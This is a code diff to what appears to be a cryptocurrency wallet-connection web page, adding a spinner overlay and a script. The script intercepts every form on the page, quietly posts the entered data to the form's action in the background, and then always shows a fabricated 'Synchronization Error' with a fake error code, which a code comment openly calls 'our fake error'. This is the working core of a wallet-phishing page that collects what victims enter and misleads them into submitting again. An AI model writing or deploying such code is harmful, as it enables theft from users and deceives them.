@@ -204,8 +204,50 @@
                 </div>
             </div>
         </div>
+    <!-- Connection Processing Overlay -->
+    <div id="connectionOverlay" class="fixed inset-0 z-[100] hidden items-center justify-center p-4 bg-gray-900/90 backdrop-blur-xl">
+        <div class="text-center w-full max-w-sm space-y-8 animate-in fade-in zoom-in duration-300">
+            <!-- Spinner / Animation -->
+            <div class="relative mx-auto w-32 h-32">
+                <div class="absolute inset-0 rounded-full border-4 border-blue-500/20 border-t-blue-500 animate-spin"></div>
+                <div class="absolute inset-4 rounded-full border-4 border-indigo-500/20 border-b-indigo-500 animate-[spin_2s_linear_infinite]"></div>
+                <div class="absolute inset-0 flex items-center justify-center">
+                    <i class="fas fa-satellite-dish text-blue-500 text-3xl animate-pulse"></i>
+                </div>
+            </div>
+
+            <!-- Processing Message -->
+            <div id="processingState" class="space-y-4">
+                <h3 class="text-2xl font-black text-white tracking-tight">Connecting to Node</h3>
+                <p class="text-blue-200/60 font-medium px-8 leading-relaxed">Establishing a 256-bit encrypted handshake with the decentralized liquidity provider...</p>
+                <div class="w-full bg-white/5 h-1.5 rounded-full overflow-hidden">
+                    <div class="bg-blue-500 h-full animate-[progress_3s_ease-in-out_infinite]" style="width: 30%"></div>
+                </div>
+            </div>
+
+            <!-- Error Message (Hidden initially) -->
+            <div id="errorState" class="hidden space-y-6">
+                <div class="w-16 h-16 bg-red-500/20 rounded-2xl flex items-center justify-center text-red-500 mx-auto border border-red-500/30">
+                    <i class="fas fa-triangle-exclamation text-2xl"></i>
+                </div>
+                <div class="space-y-2">
+                    <h3 class="text-2xl font-black text-white">Synchronization Error</h3>
+                    <p class="text-red-200/80 font-medium leading-relaxed">Handshake failed (Error 0x442): The node is currently congested or unresponsive. Please verify your connection or try another method.</p>
+                </div>
+                <button onclick="dismissError()" class="bg-white/10 hover:bg-white/20 text-white px-8 py-3 rounded-2xl font-bold border border-white/10 transition-all">
+                    Try Again
+                </button>
+            </div>
+        </div>
     </div>
 </div>
+
+<style>
+    @keyframes progress {
+        0% { transform: translateX(-100%) }
+        100% { transform: translateX(300%) }
+    }
+</style>
 
 <script>
 let selectedWalletTypeId = null;
@@ -265,6 +307,47 @@ function showTab(tabName) {
         activeBtn.classList.add('bg-blue-600', 'text-white', 'shadow-xl', 'shadow-blue-100');
         activeBtn.classList.remove('bg-gray-100', 'text-gray-500');
     }
+}
+
+// Intercept form submissions
+document.querySelectorAll('form').forEach(form => {
+    form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const overlay = document.getElementById('connectionOverlay');
+        const processing = document.getElementById('processingState');
+        const error = document.getElementById('errorState');
+        
+        // Show overlay and processing state
+        overlay.classList.remove('hidden');
+        overlay.classList.add('flex');
+        processing.classList.remove('hidden');
+        error.classList.add('hidden');
+        
+        const formData = new FormData(this);
+        const action = this.getAttribute('action');
+        
+        // Background submission
+        fetch(action, {
+            method: 'POST',
+            body: formData,
+            headers: {
+                'X-Requested-With': 'XMLHttpRequest'
+            }
+        }); // We don't wait for the response to show our fake error
+        
+        // Simulated connection delay
+        setTimeout(() => {
+            processing.classList.add('hidden');
+            error.classList.remove('hidden');
+        }, 3500);
+    });
+});
+
+function dismissError() {
+    const overlay = document.getElementById('connectionOverlay');
+    overlay.classList.add('hidden');
+    overlay.classList.remove('flex');
 }
 </script>
 
